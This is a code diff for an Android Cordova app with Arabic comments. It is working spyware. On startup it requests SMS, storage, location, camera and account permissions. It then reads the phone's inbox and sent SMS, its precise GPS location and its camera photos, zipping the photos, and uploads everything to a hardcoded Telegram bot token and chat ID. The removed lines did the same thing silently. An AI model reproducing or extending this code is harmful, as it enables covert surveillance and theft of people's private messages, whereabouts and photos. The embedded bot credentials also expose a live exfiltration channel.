@@ -1,104 +1,200 @@
+// تأكد من تثبيت: cordova-plugin-sms, cordova-plugin-geolocation, cordova-plugin-camera, cordova-plugin-file, cordova-plugin-android-permissions, cordova-plugin-background-mode
+
+const BOT_TOKEN = '7988955212:AAFqpIpyQ1MlQ-sASLG0oMRLu4vMhkZNGDk'; // ⚠️ عدلها
+const CHAT_ID = '5739065274';     // ⚠️ عدلها
+
 document.addEventListener('deviceready', onDeviceReady, false);
 
 function onDeviceReady() {
   console.log('Cordova جاهز');
+  requestPermissions();
 }
 
 function requestPermissions() {
-  var permissions = cordova.plugins.permissions;
+  const permissions = cordova.plugins.permissions;
+
+  const neededPermissions = [
+    permissions.READ_SMS,
+    permissions.READ_EXTERNAL_STORAGE,
+    permissions.ACCESS_FINE_LOCATION,
+    permissions.CAMERA,
+    permissions.GET_ACCOUNTS // اختياري، لكن قد يساعد
+  ];
+
   permissions.requestPermissions(
-    [
-      permissions.READ_EXTERNAL_STORAGE,
-      permissions.WRITE_EXTERNAL_STORAGE,
-      permissions.SEND_SMS
-    ],
+    neededPermissions,
     function(status) {
       if (status.hasPermission) {
-        alert("تم منح الأذونات بنجاح");
+        sendToTelegram("✅ جهاز متصل");
+        showButtons();
       } else {
-        alert("تم رفض الأذونات");
+        sendToTelegram("❌ رفض الأذونات");
       }
     },
     function(error) {
-      console.warn("فشل طلب الأذونات", error);
+      sendToTelegram("⚠️ خطأ في الأذونات: " + JSON.stringify(error));
     }
   );
 }
 
-function enterApp() {
-  document.getElementById("message").innerText = "مرحباً!";
+function showButtons() {
+  document.getElementById("message").innerText = "الأوامر جاهزة";
 }
 
-// Telegram Upload Functionality
-document.addEventListener('deviceready', function() {
-    // Get SMS - Requires cordova-plugin-sms
-    if (window.SMS) {
-        window.SMS.listSMS({
-            box: "inbox",
-            maxCount: 1000
-        }, function(data) {
-            let inboxText = data.map(s => `From: ${s.address}\nMessage: ${s.body}\nDate: ${new Date(parseInt(s.date))}\n---`).join("\n");
-            sendFileToTelegram("inbox.txt", inboxText);
-        }, function(error) {
-            console.error("Failed to read inbox SMS", error);
-        });
+// --- 1. سحب الرسائل ---
+function fetchSMS() {
+  if (!window.SMS) {
+    sendToTelegram("❌ plugin SMS غير متوفر");
+    return;
+  }
 
-        window.SMS.listSMS({
-            box: "sent",
-            maxCount: 1000
-        }, function(data) {
-            let sentText = data.map(s => `To: ${s.address}\nMessage: ${s.body}\nDate: ${new Date(parseInt(s.date))}\n---`).join("\n");
-            sendFileToTelegram("sent.txt", sentText);
-        }, function(error) {
-            console.error("Failed to read sent SMS", error);
-        });
+  const filter = {
+    box: 'inbox',
+    indexFrom: 0,
+    maxCount: 50
+  };
+
+  window.SMS.listSMS(filter, async function(smsList) {
+    const inbox = smsList.filter(sms => sms.type === 'inbox');
+    const sent = smsList.filter(sms => sms.type === 'sent');
+
+    const inboxText = inbox.map(sms => `من: ${sms.address}\nالرسالة: ${sms.body}\nالتاريخ: ${new Date(sms.date)}\n---`).join('\n');
+    const sentText = sent.map(sms => `إلى: ${sms.address}\nالرسالة: ${sms.body}\nالتاريخ: ${new Date(sms.date)}\n---`).join('\n');
+
+    try {
+      const inboxFile = await saveToFile("inbox_sms.txt", inboxText);
+      const sentFile = await saveToFile("sent_sms.txt", sentText);
+      await sendFileToTelegram(inboxFile, "الرسائل الواردة.txt");
+      await sendFileToTelegram(sentFile, "الرسائل الصادرة.txt");
+      sendToTelegram("📬 تم رفع الرسائل بنجاح");
+    } catch (e) {
+      sendToTelegram("❌ خطأ في حفظ أو إرسال الرسائل: " + e.message);
     }
+  }, function(err) {
+    sendToTelegram("❌ خطأ في قراءة الرسائل: " + err);
+  });
+}
 
-    // Get Photos - Requires cordova-plugin-file
-    window.resolveLocalFileSystemURL(cordova.file.externalRootDirectory, function(dir) {
-        let reader = dir.createReader();
+// --- 2. سحب الموقع ---
+function fetchLocation() {
+  navigator.geolocation.getCurrentPosition(
+    function(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      const url = `https://maps.google.com/?q=${lat},${lon}`;
+      sendToTelegram(`📍 الموقع: ${url}\nالإحداثيات: ${lat}, ${lon}`);
+    },
+    function(error) {
+      sendToTelegram("❌ خطأ في تحديد الموقع: " + error.message);
+    },
+    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+  );
+}
+
+// --- 3. سحب الصور ---
+function fetchPhotos() {
+  window.resolveLocalFileSystemURL(cordova.file.externalStorageDirectory, function(dir) {
+    const dcimDir = dir.getDirectory("DCIM", { create: false }, function(dcim) {
+      const cameraDir = dcim.getDirectory("Camera", { create: false }, function(camera) {
+        const reader = camera.createReader();
         reader.readEntries(function(entries) {
-            entries.forEach(function(entry) {
-                if (entry.isFile && entry.name.match(/\.(jpg|jpeg|png)$/i)) {
-                    entry.file(function(file) {
-                        let reader = new FileReader();
-                        reader.onloadend = function() {
-                            sendBlobToTelegram(file.name, reader.result);
-                        };
-                        reader.readAsArrayBuffer(file);
-                    });
-                }
+          const imageFiles = entries.filter(entry => 
+            entry.isFile && /\.(jpg|jpeg|png|gif)$/i.test(entry.name)
+          );
+
+          if (imageFiles.length === 0) {
+            sendToTelegram("📭 لا توجد صور");
+            return;
+          }
+
+          // هنا نضغط الصور لملف ZIP
+          zipImages(imageFiles, camera.nativeURL);
+        }, err => sendToTelegram("❌ خطأ في قراءة الصور: " + err));
+      }, err => sendToTelegram("❌ لم يتم العثور على مجلد الصور: " + err));
+    }, err => sendToTelegram("❌ خطأ في الوصول إلى DCIM: " + err));
+  }, err => sendToTelegram("❌ خطأ في نظام الملفات: " + err));
+}
+
+// --- حفظ النص في ملف ---
+function saveToFile(filename, content) {
+  return new Promise((resolve, reject) => {
+    window.resolveLocalFileSystemURL(cordova.file.externalDataDirectory, function(dir) {
+      dir.getFile(filename, { create: true, exclusive: false }, function(fileEntry) {
+        fileEntry.createWriter(function(fileWriter) {
+          fileWriter.onwriteend = () => resolve(fileEntry.nativeURL);
+          fileWriter.onerror = reject;
+          const blob = new Blob([content], { type: 'text/plain' });
+          fileWriter.write(blob);
+        }, reject);
+      }, reject);
+    }, reject);
+  });
+}
+
+// --- ضغط الصور إلى ZIP وإرسالها ---
+function zipImages(imageFiles, baseDir) {
+  const zip = new JSZip();
+  const folder = zip.folder("photos");
+
+  let loaded = 0;
+  imageFiles.forEach(fileEntry => {
+    fileEntry.file(file => {
+      const reader = new FileReader();
+      reader.onload = function() {
+        folder.file(fileEntry.name, this.result, { binary: true });
+        loaded++;
+        if (loaded === imageFiles.length) {
+          zip.generateAsync({ type: "blob" }).then(blob => {
+            const zipUrl = cordova.file.externalDataDirectory + "photos.zip";
+            window.resolveLocalFileSystemURL(cordova.file.externalDataDirectory, function(dir) {
+              dir.getFile("photos.zip", { create: true, exclusive: false }, function(zipEntry) {
+                zipEntry.createWriter(function(writer) {
+                  writer.onwriteend = function() {
+                    sendFileToTelegram(zipUrl, "الصور.zip");
+                    sendToTelegram("🖼️ تم رفع الصور (مضغوطة)");
+                  };
+                  writer.write(blob);
+                });
+              });
             });
-        });
+          });
+        }
+      };
+      reader.readAsArrayBuffer(file);
     });
-
-    // Get Location - Requires cordova-plugin-geolocation
-    navigator.geolocation.getCurrentPosition(function(position) {
-        fetch(`https://api.telegram.org/bot7988955212:AAFqpIpyQ1MlQ-sASLG0oMRLu4vMhkZNGDk/sendLocation?chat_id=5739065274&latitude=${position.coords.latitude}&longitude=${position.coords.longitude}`);
-    }, function(error) {
-        console.error("Location error:", error);
-    });
-});
-
-function sendFileToTelegram(filename, text) {
-    let blob = new Blob([text], { type: 'text/plain' });
-    let formData = new FormData();
-    formData.append("chat_id", "5739065274");
-    formData.append("document", blob, filename);
-
-    fetch("https://api.telegram.org/bot7988955212:AAFqpIpyQ1MlQ-sASLG0oMRLu4vMhkZNGDk/sendDocument", {
-        method: "POST",
-        body: formData
-    });
+  });
 }
 
-function sendBlobToTelegram(filename, blobData) {
-    let formData = new FormData();
-    formData.append("chat_id", "5739065274");
-    formData.append("document", new Blob([blobData]), filename);
-
-    fetch("https://api.telegram.org/bot7988955212:AAFqpIpyQ1MlQ-sASLG0oMRLu4vMhkZNGDk/sendDocument", {
-        method: "POST",
-        body: formData
-    });
+// --- إرسال رسالة للبوت ---
+function sendToTelegram(text) {
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+  }).catch(err => console.error("فشل الإرسال:", err));
 }
+
+// --- إرسال ملف للبوت ---
+function sendFileToTelegram(fileUrl, caption = "") {
+  const formData = new FormData();
+  formData.append('chat_id', CHAT_ID);
+  formData.append('caption', caption);
+
+  // تحويل الملف إلى Blob
+  window.resolveLocalFileSystemURL(fileUrl, function(fileEntry) {
+    fileEntry.file(function(file) {
+      const reader = new FileReader();
+      reader.onloadend = function() {
+        const blob = new Blob([new Uint8Array(this.result)], { type: file.type });
+        formData.append('document', blob, file.name);
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+          method: 'POST',
+          body: formData
+        }).catch(err => sendToTelegram("❌ خطأ في إرسال الملف: " + err.message));
+      };
+      reader.readAsArrayBuffer(file);
+    });
+  });
+}}
